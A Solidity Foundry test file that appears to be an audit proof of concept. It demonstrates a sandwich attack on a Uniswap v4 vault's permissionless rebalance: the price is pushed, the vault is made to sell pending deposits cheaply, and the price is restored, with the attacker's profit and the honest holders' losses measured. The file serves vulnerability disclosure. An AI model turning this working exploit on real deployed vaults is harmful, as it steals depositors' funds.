// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultInventory as Inventory} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultInventory.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultTypes as Types} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultTypes.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor as Actor} from
    "test/foundry/spec/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/reference/UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor.sol";

/// @notice Unprivileged sandwicher of the vault's OWN permissionless rebalance. Holds no vault shares.
///         Capital is minted to its pool actor and fully counted; price must end exactly at p0.
contract FzRebalanceSandwicher {
    Actor public actor;
    constructor(IPoolManager pool_) { actor = new Actor(pool_, address(this)); }
    bool public skipRebalance;
    function setSkip(bool v) external { skipRebalance = v; }
    function run(PoolKey memory key_, address vault_, bool zeroForOne_, uint256 push_, uint160 p0_) external {
        if (push_ != 0) actor.swapTo(key_, zeroForOne_, push_, zeroForOne_ ? 4295128740 : 1461446703485210103287273052203988822378723970341);
        if (!skipRebalance) Rebalance(vault_).rebalance(0, block.timestamp);
        actor.swapTo(key_, !zeroForOne_, 1e24, p0_);
    }
}

/// @notice NEW (p4 fuzz): price-pushed permissionless rebalance sells the vault's pending target cash at the
///         manipulated price; RebalanceTarget._validate measures loss with the liquidation quote AT the
///         manipulated/self-moved price, so it passes. Contradicts the earlier "rebalance path refuted" sweep,
///         which did not cover a vault holding un-rebalanced target cash (i.e. right after deposits).
contract FzWingsRebalanceSandwichTest is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;

    Actor internal externalLp;
    Actor internal arb;
    address internal anchor = makeAddr("anchor");
    address internal depositor = makeAddr("depositor");
    uint160 internal constant P0 = uint160(1) << 96;

    function setUp() public override {
        super.setUp();
        vm.prank(owner); indexedexManager.setDefaultLiquidReservePercentage(0.2e18);
        externalLp = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256("Apex.p4.sw.extLp")));
        arb = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256("Apex.p4.sw.arb")));
        token0.mint(address(externalLp), 1e25); token1.mint(address(externalLp), 1e25);
        token0.mint(address(arb), 1e27); token1.mint(address(arb), 1e27);
        externalLp.modify(key, -887220, 887220, int256(uint256(1e18)), bytes32(0));
        _deposit(anchor, 1e17);
        _settleKeeper(); // honest keeper converges the vault at the fair price
    }

    function _deposit(address who, uint256 amt) internal {
        token0.mint(who, amt);
        vm.startPrank(who);
        token0.approve(address(wings0), type(uint256).max);IStandardExchangeIn(address(wings0)).exchangeIn(token0, amt, IERC20(address(wings0)), 0, who, false, block.timestamp);
        vm.stopPrank();
    }

    function _arbToFair() internal {
        (uint160 p,,,) = pool.getSlot0(key.toId());
        if (p != P0) arb.swapTo(key, p > P0, 1e26, P0);
    }

    function _settleKeeper() internal {
        for (uint256 i; i < 8; ++i) {
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) returns (uint256) {} catch {}
            _arbToFair();
        }
    }

    /// fair mark of the vault at p0 (= 1 raw:1 raw): locals + position principal + uncollected fees
    function _mark() internal view returns (uint256 m) {
        (uint256 a0, uint256 a1) = wings0.localReserves();
        m = a0 + a1;
        (uint160 sp,,,) = pool.getSlot0(key.toId());
        for (uint8 i; i < 3; ++i) m += _posMark(i, sp);
    }
    function _posMark(uint8 i, uint160 sp) internal view returns (uint256) {
        (int24 lo, int24 up, uint128 liq, bytes32 salt) = wings0.position(i);
        if (liq == 0) return 0;
        (, uint256 l0, uint256 l1) = pool.getPositionInfo(key.toId(), address(wings0), lo, up, salt);
        (uint256 g0, uint256 g1) = pool.getFeeGrowthInside(key.toId(), lo, up);
        Types.Principal memory p = Inventory.principal(sp, lo, up, liq, false);
        return p.amount0 + p.amount1 + Inventory.earnedFee(liq, g0, l0) + Inventory.earnedFee(liq, g1, l1);
    }
    function _holderFair(address h) internal view returns (uint256) {
        return _mark() * IERC20(address(wings0)).balanceOf(h) / IERC20(address(wings0)).totalSupply();
    }
    function _holderNav(address h) internal view returns (uint256) {
        return wings0.liquidationValue().value * IERC20(address(wings0)).balanceOf(h) / IERC20(address(wings0)).totalSupply();
    }

    struct R { int256 profit; uint256 fairBefore; uint256 fairAfter; uint256 navBefore; uint256 navAfter; bool ok; }

    function _attack(bool zf, uint256 push) internal returns (R memory r) { return _attackX(zf, push, false); }
    function _attackX(bool zf, uint256 push, bool skip) internal returns (R memory r) {
        FzRebalanceSandwicher s = new FzRebalanceSandwicher(pool);
        s.setSkip(skip);
        address a = address(s.actor());
        token0.mint(a, 1e24); token1.mint(a, 1e24);
        int256 v0 = int256(token0.balanceOf(a) + token1.balanceOf(a));
        r.fairBefore = _holderFair(anchor) + _holderFair(depositor);
        r.navBefore = _holderNav(anchor) + _holderNav(depositor);
        try s.run(key, address(wings0), zf, push, P0) { r.ok = true; } catch (bytes memory e) { console2.logBytes(e); }
        (uint160 pe,,,) = pool.getSlot0(key.toId());
        assertEq(pe, P0, "price restored exactly");
        assertEq(IERC20(address(wings0)).balanceOf(a) + IERC20(address(wings0)).balanceOf(address(s)), 0, "attacker holds no shares");
        r.profit = int256(token0.balanceOf(a) + token1.balanceOf(a)) - v0;
        r.fairAfter = _holderFair(anchor) + _holderFair(depositor);
        r.navAfter = _holderNav(anchor) + _holderNav(depositor);
    }

    function _log(string memory tag, uint256 push, R memory r) internal pure {
        console2.log(tag, "push", push);
        console2.log("  rebalance ok", r.ok);
        console2.log("  attacker profit @p0 (raw, all costs incl. fees)"); console2.logInt(r.profit);
        console2.log("  honest holders fair value before/after", r.fairBefore, r.fairAfter);
        console2.log("  honest holders NAV (liquidation) before/after", r.navBefore, r.navAfter);
    }

    /// PoC: honest deposit arrives (not yet rebalanced); attacker pushes price down with token0, calls the
    /// permissionless rebalance (vault sells its target token0 cheap), restores p0.
    function test_PoC_pushedRebalanceAfterDeposit() public {
        _deposit(depositor, 5e16);
        uint256 snap = vm.snapshotState();
        R memory ctrl = _attack(true, 0);
        _log("CONTROL (no push, plain back-run)", 0, ctrl);
        vm.revertToState(snap);
        R memory r = _attack(true, 4e17);
        _log("ATTACK (push token0-in 4e17)", 4e17, r);
        assertTrue(r.ok, "rebalance accepted at manipulated price");
        assertGt(r.profit, 0, "attacker profit");
        assertGt(r.profit, ctrl.profit * 5, "manipulation amplifies extraction well beyond the plain back-run");
        assertLt(r.fairAfter, r.fairBefore, "honest holders lose fair value");
        assertLt(r.navAfter, r.navBefore, "honest holders lose redeemable NAV");
        console2.log("RESULT attacker profit", uint256(r.profit));
        console2.log("RESULT honest fair loss", r.fairBefore - r.fairAfter, "bps", (r.fairBefore - r.fairAfter) * 10_000 / r.fairBefore);
        console2.log("RESULT honest NAV loss", r.navBefore - r.navAfter, "bps", (r.navBefore - r.navAfter) * 10_000 / r.navBefore);
    }

    /// Sweep push size / direction / pending-deposit size. Also the settled control (no pending cash) which matches
    /// the earlier refutation.
    function test_sweep() public {
        uint256[3] memory deps = [uint256(0), 2e16, 5e16];
        uint256[4] memory pushes = [uint256(5e16), 1e17, 2e17, 4e17];
        for (uint256 d; d < deps.length; ++d) {
            uint256 s0 = vm.snapshotState();
            if (deps[d] != 0) _deposit(depositor, deps[d]);
            console2.log("===== pending deposit", deps[d]);
            for (uint256 k; k < pushes.length; ++k) {
                for (uint256 z; z < 2; ++z) {
                    uint256 s1 = vm.snapshotState();
                    R memory r = _attack(z == 0, pushes[k]);
                    _log(z == 0 ? "token0-in push" : "token1-in push", pushes[k], r);
                    vm.revertToState(s1);
                }
            }
            vm.revertToState(s0);
        }
    }

    event Rebalanced(uint256 beforeValue, uint256 afterValue, uint128 coreBefore, uint128 coreAfter);

    /// Honest baseline: an unprivileged keeper rebalances the pending deposit at the fair price, then an
    /// independent arbitrageur restores p0. This is what the honest holders would otherwise get.
    function _honestBaseline() internal returns (uint256 fairAfter) {
        address keeper = makeAddr("keeper");
        vm.prank(keeper);
        Rebalance(address(wings0)).rebalance(0, block.timestamp);
        _arbToFair();
        fairAfter = _holderFair(anchor) + _holderFair(depositor);
    }

    function _runFinal(uint256 pending, uint256 push) internal returns (int256 profit, uint256 victimLoss) {
        _deposit(depositor, pending);
        uint256 snap = vm.snapshotState();
        uint256 fair0 = _holderFair(anchor) + _holderFair(depositor);
        uint256 base = _honestBaseline();
        vm.revertToState(snap);
        R memory noReb = _attackX(true, push, true);
        vm.revertToState(snap);
        vm.recordLogs();
        R memory r = _attackX(true, push, false);
        uint256 qBefore; uint256 qAfter;
        {
            bytes32 sig = keccak256("Rebalanced(uint256,uint256,uint128,uint128)");
            Vm.Log[] memory logs = vm.getRecordedLogs();
            for (uint256 i; i < logs.length; ++i) if (logs[i].emitter == address(wings0) && logs[i].topics[0] == sig) {
                (qBefore, qAfter,,) = abi.decode(logs[i].data, (uint256, uint256, uint128, uint128));
            }
        }
        console2.log("==== pending deposit", pending, "push token0-in", push);
        console2.log("  honest holders fair: pre-rebalance", fair0);
        console2.log("  honest holders fair: after HONEST keeper rebalance @p0 + arb", base);
        console2.log("  honest holders fair: after ATTACK", r.fairAfter);
        console2.log("  vault self-check quote before/after (manipulated price)", qBefore, qAfter);
        console2.log("  attacker push+restore WITHOUT rebalance profit:"); console2.logInt(noReb.profit);
        console2.log("  attacker sandwich profit @p0 (all fees counted):"); console2.logInt(r.profit);
        assertTrue(r.ok, "rebalance accepted at manipulated price");
        assertGt(qBefore, 0, "Rebalanced event seen");
        assertLe(qBefore > qAfter ? qBefore - qAfter : 0, qBefore / 100, "self-check sees <=1% loss");
        assertLt(noReb.profit, 0, "price round trip alone is a loss (fees)");
        assertGt(r.profit, 0, "attacker net profit");
        assertLt(r.fairAfter, base, "honest holders worse than honest-keeper baseline");
        victimLoss = base - r.fairAfter;
        profit = r.profit;
        console2.log("  RESULT victim loss vs honest baseline", victimLoss, "bps", victimLoss * 10_000 / base);
        console2.log("  RESULT attacker profit", uint256(profit));
    }

    function test_PoC_final_pending5e16_push4e17() public { _runFinal(5e16, 4e17); }
    function test_PoC_final_pending5e16_push1e17() public { _runFinal(5e16, 1e17); }
    function test_PoC_final_pending2e16_push2e17() public { _runFinal(2e16, 2e17); }
}
